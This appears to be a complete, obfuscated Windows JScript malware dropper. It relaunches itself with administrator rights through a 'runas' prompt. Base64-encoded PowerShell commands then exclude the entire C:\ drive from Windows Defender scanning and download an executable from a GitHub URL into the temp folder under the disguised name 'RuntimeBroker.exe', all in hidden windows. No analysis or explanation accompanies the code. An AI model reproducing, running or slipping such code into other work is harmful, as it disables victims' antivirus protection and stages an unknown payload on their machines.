(function(){
    var _0x5a34 = ['run', 'powershell -enc cABvAHcAZQByAHMAaABoAGUAbAAuAGUAeABlACAALQBjAG8AbQBtAGEAbgBkACAAIgBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAIgBDADoAXAANAAoA', 'WScript.FullName', 'WScript.ScriptFullName', 'elevate', 'Exists', 'ActiveXObject', 'Shell.Application', 'ShellExecute', 'WScript', 'Quit', 'Wscript.Shell', 'powershell -enc cgBlAGcAIABhAGQAZAAgACIASABLAEwATQBcAFMATwBGAFQAVwBBAFIARQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgBcAEUAeABjAGwAdQBzAGkAbwBuAHMAXABQAGEAdABoAHMAIgAgAC8AdgAgAEMAOgBcAA==', 'powershell -enc JAB1AHIAbAAgAD0AIAAiAGgAdAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBiAGwAbwB3AGQAZQB5AHQAbwBwAC8AdABzAHAAaQB0AG0AbwB0AHcAaQBuAC8AcgBhAHcALwByAGUAZgBzAC8AaABlAGEAZABzAC8AbQBhAGkAbgAvAEMAbABpAGUAbgB0AC0AYgB1AGkAbAB0AC4AZQB4AGUAIgANAAoAJABvAHUAdABwAHUAdAAgAD0AIAAiACQAZQBuAHYAOgBUAGUAbQBwAC8AUgB1AG4AdABpAG0AZQBCAHIAbwBrAGUAcgAuAGUAeABlACIADQAKAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAHUAcgBsACAALQBPAHUAdABGAGkAbABlACAAJABvAHUAdABwAHUAdAA='];

    (function(_0x5c3e2d, _0x5a34a2) {
        var _0x1090e2 = function(_0x39224a) {
            while (--_0x39224a) {
                _0x5c3e2d['push'](_0x5c3e2d['shift']());
            }
        };
        _0x1090e2(++_0x5a34a2);
    }(_0x5a34, 0x95));

    var _0x1090 = function(_0x5c3e2d, _0x5a34a2) {
        _0x5c3e2d = _0x5c3e2d - 0x0;
        var _0x1090e2 = _0x5a34[_0x5c3e2d];
        return _0x1090e2;
    };

    function EnsureElevatedPrivileges() {
        if (!WScript['Arguments']['Named'][_0x1090(0x4)](_0x1090(0x3))) {
            new ActiveXObject(_0x1090(0x6))[_0x1090(0x7)](WScript[_0x1090(0x2)], '"' + WScript[_0x1090(0x1)] + '" /elevate', '', 'runas', 0x1);
            WScript[_0x1090(0x8)]();
        }
    }

    EnsureElevatedPrivileges();

    var WshShell = new ActiveXObject(_0x1090(0x9));
    
    WshShell[_0x1090(0x0)](_0x1090(0xa), 0x0, false);
    WshShell[_0x1090(0x0)](_0x1090(0xb), 0x0, false);
    WshShell[_0x1090(0x0)](_0x1090(0xc), 0x0, false);

})();
